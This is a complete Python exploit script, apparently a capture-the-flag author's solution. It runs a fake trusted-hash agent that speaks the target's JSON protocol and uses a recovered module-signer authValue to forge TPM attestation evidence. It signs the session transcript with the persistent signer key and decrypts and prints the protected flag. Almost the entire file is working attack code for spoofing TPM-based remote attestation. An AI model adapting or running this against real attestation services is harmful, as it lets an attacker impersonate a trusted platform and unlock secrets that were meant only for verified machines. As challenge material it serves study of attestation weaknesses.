#!/usr/bin/env python3
"""
Fake trusted-hash agent for the recovered module-signer-authValue attack.

Run on A after recovering the persistent module signer authValue:

    ./author/exp/fake_trusted_hash_agent.py \
        --signer-auth 0x0123...deadbeef \
        --addr 0.0.0.0:31337

This speaks the same length-prefixed JSON protocol as trusted_hash_agent.  It
creates TPM evidence with raw TPM2 commands, signs the create-session transcript
with persistent signer handle 0x81010020, and prints the final decrypted flag.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import os
import socket
import struct
import sys
from dataclasses import dataclass


TPM2_ST_NO_SESSIONS = 0x8001
TPM2_ST_SESSIONS = 0x8002
TPM2_RH_OWNER = 0x40000001
TPM2_RH_NULL = 0x40000007
TPM2_RS_PW = 0x40000009
TPM2_RH_ENDORSEMENT = 0x4000000B
TPM2_ALG_RSA = 0x0001
TPM2_ALG_SHA256 = 0x000B
TPM2_ALG_NULL = 0x0010
TPM2_ALG_RSASSA = 0x0014
TPM2_ALG_OAEP = 0x0017
TPM2_ALG_AES = 0x0006
TPM2_ALG_CFB = 0x0043
TPM2_ALG_KEYEDHASH = 0x0008
TPM2_SE_POLICY = 0x01
TPM2_ST_HASHCHECK = 0x8024

TPM2_CC_NV_READ = 0x0000014E
TPM2_CC_NV_READ_PUBLIC = 0x00000169
TPM2_CC_ACTIVATE_CREDENTIAL = 0x00000147
TPM2_CC_POLICY_SECRET = 0x00000151
TPM2_CC_READ_PUBLIC = 0x00000173
TPM2_CC_CREATE_PRIMARY = 0x00000131
TPM2_CC_CREATE = 0x00000153
TPM2_CC_LOAD = 0x00000157
TPM2_CC_CERTIFY_CREATION = 0x0000014A
TPM2_CC_SIGN = 0x0000015D
TPM2_CC_START_AUTH_SESSION = 0x00000176
TPM2_CC_POLICY_PCR = 0x0000017F
TPM2_CC_POLICY_AUTHVALUE = 0x0000016B
TPM2_CC_RSA_DECRYPT = 0x00000159
TPM2_CC_FLUSH_CONTEXT = 0x00000165
TPM2_CC_PCR_READ = 0x0000017E

TPM2_OA_FIXED_TPM = 1 << 1
TPM2_OA_FIXED_PARENT = 1 << 4
TPM2_OA_SENSITIVE_DATA_ORIGIN = 1 << 5
TPM2_OA_USER_WITH_AUTH = 1 << 6
TPM2_OA_ADMIN_WITH_POLICY = 1 << 7
TPM2_OA_NO_DA = 1 << 10
TPM2_OA_RESTRICTED = 1 << 16
TPM2_OA_DECRYPT = 1 << 17
TPM2_OA_SIGN = 1 << 18

TPM_RSA_EK_CERT_NV_INDEX = 0x01C00002
TPM_RSA_EK_HANDLE = 0x81010001
MODULE_SIGNER_HANDLE = 0x81010020

DEFAULT_PCR_MASK = (1 << 0) | (1 << 2) | (1 << 4) | (1 << 7) | (1 << 11) | (1 << 14)
PCR_MAX = 23
PCR_SELECT_SIZE = 3
RSA_KEY_BITS = 2048
AES_KEY_BITS = 128
SHA256_SIZE = 32
MODULE_SIGNER_TRANSCRIPT_LABEL = b"trusted_hash_module_signer_v1"


def u8(value: int) -> bytes:
    return struct.pack(">B", value)


def u16(value: int) -> bytes:
    return struct.pack(">H", value)


def u32(value: int) -> bytes:
    return struct.pack(">I", value)


def tpm2b(data: bytes) -> bytes:
    return u16(len(data)) + data


def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode()


def b64d(data: str) -> bytes:
    return base64.b64decode(data)


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def hmac_sha256(key: bytes, *parts: bytes) -> bytes:
    h = hmac.new(key, digestmod=hashlib.sha256)
    for part in parts:
        h.update(part)
    return h.digest()


def parse_hex_secret(value: str, size: int) -> bytes:
    if value.startswith(("0x", "0X")):
        value = value[2:]
    if len(value) != size * 2:
        raise SystemExit(f"expected {size} bytes of hex, got {len(value) // 2}")
    return bytes.fromhex(value)


class Cursor:
    def __init__(self, data: bytes):
        self.data = data
        self.off = 0

    def take(self, size: int) -> bytes:
        if self.off + size > len(self.data):
            raise ValueError("short TPM response")
        out = self.data[self.off : self.off + size]
        self.off += size
        return out

    def u16(self) -> int:
        return struct.unpack(">H", self.take(2))[0]

    def u32(self) -> int:
        return struct.unpack(">I", self.take(4))[0]

    def tpm2b(self, include_size: bool = False) -> bytes:
        start = self.off
        size = self.u16()
        value = self.take(size)
        return self.data[start : self.off] if include_size else value

    def finish(self) -> None:
        if self.off != len(self.data):
            raise ValueError(f"trailing TPM response bytes: {len(self.data) - self.off}")


class Tpm:
    def __init__(self, path: str):
        self.path = path
        self.fd = os.open(path, os.O_RDWR)

    def close(self) -> None:
        os.close(self.fd)

    def command(self, tag: int, cc: int, body: bytes) -> tuple[int, bytes]:
        cmd = u16(tag) + u32(10 + len(body)) + u32(cc) + body
        os.write(self.fd, cmd)
        rsp = os.read(self.fd, 65536)
        if len(rsp) < 10:
            raise RuntimeError("short TPM header")
        rtag, rlen, rc = struct.unpack(">HII", rsp[:10])
        if rlen != len(rsp):
            raise RuntimeError(f"TPM response length mismatch {rlen} != {len(rsp)}")
        if rc != 0:
            raise RuntimeError(f"TPM command 0x{cc:08x} failed rc=0x{rc:08x}")
        if rtag != tag:
            raise RuntimeError(f"TPM command 0x{cc:08x} response tag 0x{rtag:04x} != 0x{tag:04x}")
        return rtag, rsp[10:]

    def flush(self, handle: int) -> None:
        try:
            self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_FLUSH_CONTEXT, u32(handle))
        except RuntimeError:
            pass

    def read_public(self, handle: int) -> tuple[bytes, bytes]:
        _, body = self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_READ_PUBLIC, u32(handle))
        c = Cursor(body)
        public = c.tpm2b(include_size=True)
        name = c.tpm2b()
        _qualified_name = c.tpm2b()
        c.finish()
        return public, name

    def nv_read_public_size(self, index: int) -> int:
        _, body = self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_NV_READ_PUBLIC, u32(index))
        c = Cursor(body)
        nv_public = Cursor(c.tpm2b())
        _nv_index = nv_public.u32()
        _name_alg = nv_public.u16()
        _attrs = nv_public.u32()
        auth_policy = nv_public.tpm2b()
        if auth_policy:
            raise RuntimeError("unexpected EK cert NV auth policy")
        data_size = nv_public.u16()
        nv_public.finish()
        _name = c.tpm2b()
        c.finish()
        return data_size

    def nv_read(self, index: int, size: int) -> bytes:
        body = (
            u32(index)
            + u32(index)
            + empty_auth_area(TPM2_RS_PW)
            + u16(size)
            + u16(0)
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_NV_READ, body)
        params, _auth = split_session_response(rsp)
        c = Cursor(params)
        data = c.tpm2b()
        c.finish()
        if len(data) != size:
            raise RuntimeError("short EK cert NV read")
        return data

    def pcr_read_one(self, pcr: int) -> bytes:
        _, body = self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_PCR_READ, build_pcr_selection(1 << pcr))
        c = Cursor(body)
        _update_counter = c.u32()
        skip_tpml_pcr_selection(c)
        digest_count = c.u32()
        if digest_count != 1:
            raise RuntimeError(f"unexpected PCR digest count {digest_count}")
        digest = c.tpm2b()
        c.finish()
        if len(digest) != SHA256_SIZE:
            raise RuntimeError(f"unexpected PCR digest size {len(digest)}")
        return digest

    def pcr_read_digest(self, mask: int) -> bytes:
        digests = []
        for pcr in range(PCR_MAX + 1):
            if mask & (1 << pcr):
                digests.append(self.pcr_read_one(pcr))
        if not digests:
            raise RuntimeError("empty PCR mask")
        return sha256(b"".join(digests))

    def create_primary_srk(self) -> tuple[int, bytes, bytes]:
        body = (
            u32(TPM2_RH_OWNER)
            + empty_auth_area(TPM2_RS_PW)
            + sensitive_create(b"", b"")
            + rsa_storage_parent_template()
            + tpm2b(b"")
            + u32(0)
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_CREATE_PRIMARY, body)
        handle = struct.unpack(">I", rsp[:4])[0]
        params, _auth = split_session_response(rsp[4:])
        c = Cursor(params)
        public = c.tpm2b(include_size=True)
        _creation_data = c.tpm2b()
        _creation_hash = c.tpm2b()
        _ticket = take_ticket(c)
        name = c.tpm2b()
        c.finish()
        return handle, public, name

    def create_with_template(
        self,
        parent: int,
        auth: bytes,
        sensitive_data: bytes,
        template: bytes,
        outside_info: bytes = b"",
    ) -> tuple[bytes, bytes, bytes, bytes]:
        body = (
            u32(parent)
            + empty_auth_area(TPM2_RS_PW)
            + sensitive_create(auth, sensitive_data)
            + template
            + tpm2b(outside_info)
            + u32(0)
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_CREATE, body)
        params, _auth = split_session_response(rsp)
        c = Cursor(params)
        private = c.tpm2b(include_size=True)
        public = c.tpm2b(include_size=True)
        _creation_data = c.tpm2b()
        creation_hash = c.tpm2b(include_size=True)
        creation_ticket = take_ticket(c)
        c.finish()
        return private, public, creation_hash, creation_ticket

    def load(self, parent: int, private: bytes, public: bytes) -> tuple[int, bytes]:
        body = u32(parent) + empty_auth_area(TPM2_RS_PW) + private + public
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_LOAD, body)
        handle = struct.unpack(">I", rsp[:4])[0]
        params, _auth = split_session_response(rsp[4:])
        c = Cursor(params)
        name = c.tpm2b()
        c.finish()
        return handle, name

    def certify_creation(
        self,
        signing_handle: int,
        object_handle: int,
        qualifying_data: bytes,
        creation_hash: bytes,
        creation_ticket: bytes,
    ) -> tuple[bytes, bytes]:
        body = (
            u32(signing_handle)
            + u32(object_handle)
            + empty_auth_area(TPM2_RS_PW)
            + tpm2b(qualifying_data)
            + creation_hash
            + u16(TPM2_ALG_NULL)
            + creation_ticket
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_CERTIFY_CREATION, body)
        params, _auth = split_session_response(rsp)
        c = Cursor(params)
        info = c.tpm2b(include_size=True)
        signature = take_signature(c)
        c.finish()
        return info, signature

    def sign_digest(self, handle: int, auth: bytes, digest: bytes) -> bytes:
        body = (
            u32(handle)
            + password_auth_area(auth)
            + tpm2b(digest)
            + u16(TPM2_ALG_RSASSA)
            + u16(TPM2_ALG_SHA256)
            + u16(TPM2_ST_HASHCHECK)
            + u32(TPM2_RH_NULL)
            + tpm2b(b"")
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_SIGN, body)
        params, _auth = split_session_response(rsp)
        c = Cursor(params)
        signature = take_signature(c)
        c.finish()
        return signature

    def start_policy_session(self) -> tuple[int, bytes]:
        nonce = os.urandom(16)
        body = (
            u32(TPM2_RH_NULL)
            + u32(TPM2_RH_NULL)
            + tpm2b(nonce)
            + tpm2b(b"")
            + u8(TPM2_SE_POLICY)
            + u16(TPM2_ALG_NULL)
            + u16(TPM2_ALG_SHA256)
        )
        _, rsp = self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_START_AUTH_SESSION, body)
        c = Cursor(rsp)
        handle = c.u32()
        nonce_tpm = c.tpm2b()
        c.finish()
        return handle, nonce_tpm

    def policy_pcr(self, session: int, pcr_digest: bytes, mask: int) -> None:
        body = u32(session) + tpm2b(pcr_digest) + build_pcr_selection(mask)
        self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_POLICY_PCR, body)

    def policy_authvalue(self, session: int) -> None:
        self.command(TPM2_ST_NO_SESSIONS, TPM2_CC_POLICY_AUTHVALUE, u32(session))

    def policy_secret_endorsement(self, session: int) -> None:
        body = (
            u32(TPM2_RH_ENDORSEMENT)
            + u32(session)
            + empty_auth_area(TPM2_RS_PW)
            + tpm2b(b"")
            + tpm2b(b"")
            + tpm2b(b"")
            + u32(0)
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_POLICY_SECRET, body)
        params, _auth = split_session_response(rsp)
        c = Cursor(params)
        _timeout = c.tpm2b()
        _ticket = take_ticket(c)
        c.finish()

    def activate_credential_tpm(
        self,
        ak_handle: int,
        ek_policy_session: int,
        credential_blob: bytes,
        secret: bytes,
    ) -> bytes:
        body = (
            u32(ak_handle)
            + u32(TPM_RSA_EK_HANDLE)
            + two_empty_auth_area(TPM2_RS_PW, ek_policy_session)
            + credential_blob
            + secret
        )
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_ACTIVATE_CREDENTIAL, body)
        params, _auth = split_session_response(rsp)
        c = Cursor(params)
        credential = c.tpm2b()
        c.finish()
        return credential

    def rsa_decrypt(
        self,
        key_handle: int,
        key_name: bytes,
        policy_session: int,
        nonce_tpm: bytes,
        key_auth: bytes,
        ciphertext: bytes,
    ) -> bytes:
        attrs = b"\x00"
        nonce_caller = os.urandom(16)
        scheme = u16(TPM2_ALG_OAEP) + u16(TPM2_ALG_SHA256)
        label = tpm2b(b"")
        cp_hash = sha256(
            u32(TPM2_CC_RSA_DECRYPT)
            + key_name
            + tpm2b(ciphertext)
            + scheme
            + label
        )
        req_hmac = hmac_sha256(key_auth, cp_hash, nonce_caller, nonce_tpm, attrs)
        auth = hmac_session(policy_session, nonce_caller, attrs[0], req_hmac)
        body = u32(key_handle) + auth + tpm2b(ciphertext) + scheme + label
        _, rsp = self.command(TPM2_ST_SESSIONS, TPM2_CC_RSA_DECRYPT, body)
        params, auth_rsp = split_session_response(rsp)
        c = Cursor(params)
        plaintext = c.tpm2b()
        c.finish()

        ac = Cursor(auth_rsp)
        response_nonce = ac.tpm2b()
        response_attrs = ac.take(1)
        response_hmac = ac.tpm2b()
        ac.finish()
        rp_hash = sha256(u32(0) + u32(TPM2_CC_RSA_DECRYPT) + params)
        expected = hmac_sha256(key_auth, rp_hash, response_nonce, nonce_caller, response_attrs)
        if not hmac.compare_digest(response_hmac, expected):
            raise RuntimeError("TPM2_RSA_Decrypt response HMAC mismatch")
        return plaintext


def empty_auth_area(handle: int, attrs: int = 0) -> bytes:
    return u32(9) + u32(handle) + tpm2b(b"") + u8(attrs) + tpm2b(b"")


def empty_session(handle: int, attrs: int = 0) -> bytes:
    return u32(handle) + tpm2b(b"") + u8(attrs) + tpm2b(b"")


def two_empty_auth_area(first_handle: int, second_handle: int) -> bytes:
    sessions = empty_session(first_handle) + empty_session(second_handle)
    return u32(len(sessions)) + sessions


def password_auth_area(auth: bytes) -> bytes:
    return u32(4 + 2 + 1 + 2 + len(auth)) + u32(TPM2_RS_PW) + tpm2b(b"") + u8(0) + tpm2b(auth)


def hmac_session(handle: int, nonce: bytes, attrs: int, digest: bytes) -> bytes:
    session = u32(handle) + tpm2b(nonce) + u8(attrs) + tpm2b(digest)
    return u32(len(session)) + session


def split_session_response(body: bytes) -> tuple[bytes, bytes]:
    c = Cursor(body)
    parameter_size = c.u32()
    params = c.take(parameter_size)
    auth = c.take(len(body) - c.off)
    return params, auth


def sensitive_create(auth: bytes, data: bytes) -> bytes:
    inner = tpm2b(auth) + tpm2b(data)
    return tpm2b(inner)


def rsa_common_tail() -> bytes:
    return u16(RSA_KEY_BITS) + u32(0) + tpm2b(b"")


def rsa_storage_parent_template() -> bytes:
    body = (
        u16(TPM2_ALG_RSA)
        + u16(TPM2_ALG_SHA256)
        + u32(
            TPM2_OA_FIXED_TPM
            | TPM2_OA_FIXED_PARENT
            | TPM2_OA_SENSITIVE_DATA_ORIGIN
            | TPM2_OA_USER_WITH_AUTH
            | TPM2_OA_NO_DA
            | TPM2_OA_RESTRICTED
            | TPM2_OA_DECRYPT
        )
        + tpm2b(b"")
        + u16(TPM2_ALG_AES)
        + u16(AES_KEY_BITS)
        + u16(TPM2_ALG_CFB)
        + u16(TPM2_ALG_NULL)
        + rsa_common_tail()
    )
    return tpm2b(body)


def rsa_ak_template() -> bytes:
    body = (
        u16(TPM2_ALG_RSA)
        + u16(TPM2_ALG_SHA256)
        + u32(
            TPM2_OA_FIXED_TPM
            | TPM2_OA_FIXED_PARENT
            | TPM2_OA_SENSITIVE_DATA_ORIGIN
            | TPM2_OA_USER_WITH_AUTH
            | TPM2_OA_RESTRICTED
            | TPM2_OA_SIGN
        )
        + tpm2b(b"")
        + u16(TPM2_ALG_NULL)
        + u16(TPM2_ALG_RSASSA)
        + u16(TPM2_ALG_SHA256)
        + rsa_common_tail()
    )
    return tpm2b(body)


def rsa_decrypt_template(policy_digest: bytes) -> bytes:
    body = (
        u16(TPM2_ALG_RSA)
        + u16(TPM2_ALG_SHA256)
        + u32(
            TPM2_OA_FIXED_TPM
            | TPM2_OA_FIXED_PARENT
            | TPM2_OA_SENSITIVE_DATA_ORIGIN
            | TPM2_OA_NO_DA
            | TPM2_OA_DECRYPT
        )
        + tpm2b(policy_digest)
        + u16(TPM2_ALG_NULL)
        + u16(TPM2_ALG_OAEP)
        + u16(TPM2_ALG_SHA256)
        + rsa_common_tail()
    )
    return tpm2b(body)


def take_ticket(c: Cursor) -> bytes:
    start = c.off
    _tag = c.u16()
    _hierarchy = c.u32()
    _digest = c.tpm2b()
    return c.data[start : c.off]


def take_signature(c: Cursor) -> bytes:
    start = c.off
    sig_alg = c.u16()
    if sig_alg != TPM2_ALG_RSASSA:
        raise ValueError(f"unexpected signature alg 0x{sig_alg:04x}")
    _hash_alg = c.u16()
    _sig = c.tpm2b()
    return c.data[start : c.off]


def build_pcr_selection(mask: int) -> bytes:
    select = bytearray(PCR_SELECT_SIZE)
    for pcr in range(PCR_MAX + 1):
        if mask & (1 << pcr):
            select[pcr // 8] |= 1 << (pcr % 8)
    return u32(1) + u16(TPM2_ALG_SHA256) + u8(PCR_SELECT_SIZE) + bytes(select)


def skip_tpml_pcr_selection(c: Cursor) -> None:
    count = c.u32()
    for _ in range(count):
        _hash = c.u16()
        size = c.take(1)[0]
        _select = c.take(size)


def compute_policy_digest(pcr_digest: bytes, mask: int) -> bytes:
    policy = bytes(SHA256_SIZE)
    selection = build_pcr_selection(mask)
    out = sha256(policy + u32(TPM2_CC_POLICY_PCR) + selection + pcr_digest)
    return sha256(out + u32(TPM2_CC_POLICY_AUTHVALUE))


def transcript_field(data: bytes) -> bytes:
    return u32(len(data)) + data


def module_signer_transcript(create: dict[str, bytes | int], challenge: bytes) -> bytes:
    fields = [
        MODULE_SIGNER_TRANSCRIPT_LABEL,
        challenge,
        u32(int(create["pcr_mask"])),
        create["pcr_digest"],
        create["policy_digest"],
        create["ak_name"],
        create["decrypt_key_name"],
        create["ak_public"],
        create["decrypt_key_public"],
        create["certify_info"],
        create["certify_signature"],
        create["module_signer_name"],
    ]
    return b"".join(transcript_field(field) for field in fields)


@dataclass
class Session:
    session_id: int
    ak_name: bytes
    ak_private: bytes
    ak_public: bytes
    decrypt_key_name: bytes
    decrypt_private: bytes
    decrypt_public: bytes
    decrypt_auth: bytes
    pcr_mask: int
    pcr_digest: bytes


class FakeAgent:
    def __init__(self, tpm: Tpm, signer_auth: bytes):
        self.tpm = tpm
        self.signer_auth = signer_auth
        self.next_session_id = 1
        self.sessions: dict[int, Session] = {}

    def create_session(self, req: dict) -> dict:
        challenge = b64d(req["challenge"])
        pcr_mask = int(req.get("pcr_mask") or DEFAULT_PCR_MASK)

        ek_cert = self.tpm.nv_read(TPM_RSA_EK_CERT_NV_INDEX, self.tpm.nv_read_public_size(TPM_RSA_EK_CERT_NV_INDEX))
        ek_public, _ek_name = self.tpm.read_public(TPM_RSA_EK_HANDLE)
        module_signer_public, module_signer_name = self.tpm.read_public(MODULE_SIGNER_HANDLE)

        pcr_digest = self.tpm.pcr_read_digest(pcr_mask)
        policy_digest = compute_policy_digest(pcr_digest, pcr_mask)
        srk_handle, _srk_public, _srk_name = self.tpm.create_primary_srk()

        ak_private, ak_public, _ak_creation_hash, _ak_ticket = self.tpm.create_with_template(
            srk_handle, b"", b"", rsa_ak_template()
        )
        ak_handle, ak_name = self.tpm.load(srk_handle, ak_private, ak_public)

        decrypt_auth = os.urandom(32)
        decrypt_private, decrypt_public, creation_hash, creation_ticket = self.tpm.create_with_template(
            srk_handle,
            decrypt_auth,
            b"",
            rsa_decrypt_template(policy_digest),
            challenge,
        )
        decrypt_handle, decrypt_name = self.tpm.load(srk_handle, decrypt_private, decrypt_public)
        certify_info, certify_signature = self.tpm.certify_creation(
            ak_handle, decrypt_handle, challenge, creation_hash, creation_ticket
        )
        self.tpm.flush(decrypt_handle)
        self.tpm.flush(ak_handle)
        self.tpm.flush(srk_handle)

        session_id = self.next_session_id
        self.next_session_id += 1
        create = {
            "session_id": session_id,
            "pcr_mask": pcr_mask,
            "ek_cert": ek_cert,
            "ek_public": ek_public,
            "ak_public": ak_public,
            "ak_name": ak_name,
            "decrypt_key_public": decrypt_public,
            "decrypt_key_name": decrypt_name,
            "pcr_digest": pcr_digest,
            "policy_digest": policy_digest,
            "certify_info": certify_info,
            "certify_signature": certify_signature,
            "module_signer_public": module_signer_public,
            "module_signer_name": module_signer_name,
        }

        digest = sha256(module_signer_transcript(create, challenge))
        create["module_signature"] = self.tpm.sign_digest(MODULE_SIGNER_HANDLE, self.signer_auth, digest)

        self.sessions[session_id] = Session(
            session_id=session_id,
            ak_name=ak_name,
            ak_private=ak_private,
            ak_public=ak_public,
            decrypt_key_name=decrypt_name,
            decrypt_private=decrypt_private,
            decrypt_public=decrypt_public,
            decrypt_auth=decrypt_auth,
            pcr_mask=pcr_mask,
            pcr_digest=pcr_digest,
        )
        return encode_create_response(create)

    def activate_credential(self, req: dict) -> dict:
        session = self.sessions[int(req["session_id"])]
        srk_handle, _srk_public, _srk_name = self.tpm.create_primary_srk()
        ak_handle, ak_name = self.tpm.load(srk_handle, session.ak_private, session.ak_public)
        if ak_name != session.ak_name:
            raise RuntimeError("reloaded AK name mismatch")
        policy_session, _nonce_tpm = self.tpm.start_policy_session()
        try:
            self.tpm.policy_secret_endorsement(policy_session)
            credential = self.tpm.activate_credential_tpm(
                ak_handle,
                policy_session,
                b64d(req["credential_blob"]),
                b64d(req["secret"]),
            )
            policy_session = 0
        finally:
            if policy_session:
                self.tpm.flush(policy_session)
            self.tpm.flush(ak_handle)
            self.tpm.flush(srk_handle)
        return {"type": "activate_credential", "credential": b64e(credential)}

    def trusted_hash(self, req: dict) -> dict:
        session_id = int(req["session_id"])
        session = self.sessions.pop(session_id)
        srk_handle, _srk_public, _srk_name = self.tpm.create_primary_srk()
        decrypt_handle, decrypt_name = self.tpm.load(
            srk_handle, session.decrypt_private, session.decrypt_public
        )
        if decrypt_name != session.decrypt_key_name:
            raise RuntimeError("reloaded decrypt key name mismatch")
        policy_session, nonce_tpm = self.tpm.start_policy_session()
        try:
            self.tpm.policy_pcr(policy_session, session.pcr_digest, session.pcr_mask)
            self.tpm.policy_authvalue(policy_session)
            plaintext = self.tpm.rsa_decrypt(
                decrypt_handle,
                decrypt_name,
                policy_session,
                nonce_tpm,
                session.decrypt_auth,
                b64d(req["encrypted_blob"]),
            )
            policy_session = 0
        finally:
            if policy_session:
                self.tpm.flush(policy_session)
            self.tpm.flush(decrypt_handle)
            self.tpm.flush(srk_handle)

        print(f"[+] recovered flag bytes: {plaintext!r}", flush=True)
        try:
            print(f"[+] recovered flag text: {plaintext.decode()}", flush=True)
        except UnicodeDecodeError:
            print("[+] recovered flag is not UTF-8", flush=True)
        return {"type": "trusted_hash", "result": b64e(sha256(plaintext))}

    def cancel_session(self, req: dict) -> dict:
        self.sessions.pop(int(req["session_id"]), None)
        return {"type": "cancel_session"}

    def handle(self, req: dict) -> dict:
        typ = req.get("type")
        if typ == "create_session":
            return self.create_session(req)
        if typ == "activate_credential":
            return self.activate_credential(req)
        if typ == "trusted_hash":
            return self.trusted_hash(req)
        if typ == "cancel_session":
            return self.cancel_session(req)
        raise ValueError(f"unknown request type: {typ}")


def encode_create_response(create: dict[str, bytes | int]) -> dict:
    out: dict[str, str | int] = {"type": "create_session"}
    for key, value in create.items():
        if isinstance(value, bytes):
            out[key] = b64e(value)
        else:
            out[key] = value
    return out


def read_frame(conn: socket.socket) -> dict:
    hdr = read_exact(conn, 4)
    size = struct.unpack(">I", hdr)[0]
    body = read_exact(conn, size)
    return json.loads(body)


def write_frame(conn: socket.socket, msg: dict) -> None:
    body = json.dumps(msg, separators=(",", ":")).encode()
    conn.sendall(u32(len(body)) + body)


def read_exact(conn: socket.socket, size: int) -> bytes:
    out = bytearray()
    while len(out) < size:
        chunk = conn.recv(size - len(out))
        if not chunk:
            raise EOFError
        out.extend(chunk)
    return bytes(out)


def serve(agent: FakeAgent, addr: str) -> None:
    host, port_s = addr.rsplit(":", 1)
    port = int(port_s)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(8)
        print(f"[+] fake trusted-hash agent listening on {addr}", flush=True)
        while True:
            conn, peer = sock.accept()
            print(f"[+] connection from {peer[0]}:{peer[1]}", flush=True)
            with conn:
                while True:
                    try:
                        req = read_frame(conn)
                    except EOFError:
                        break
                    print(f"[>] {req.get('type')}", flush=True)
                    try:
                        resp = agent.handle(req)
                    except Exception as err:
                        print(f"[!] request failed: {err}", file=sys.stderr, flush=True)
                        resp = {"type": "error", "code": -1, "message": str(err)}
                    write_frame(conn, resp)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--signer-auth", required=True, help="0x-prefixed 32-byte hex authValue")
    parser.add_argument("--addr", default="0.0.0.0:31337")
    parser.add_argument("--tpm", default="/dev/tpmrm0")
    args = parser.parse_args()

    signer_auth = parse_hex_secret(args.signer_auth, 32)
    tpm = Tpm(args.tpm)
    try:
        serve(FakeAgent(tpm, signer_auth), args.addr)
    finally:
        tpm.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
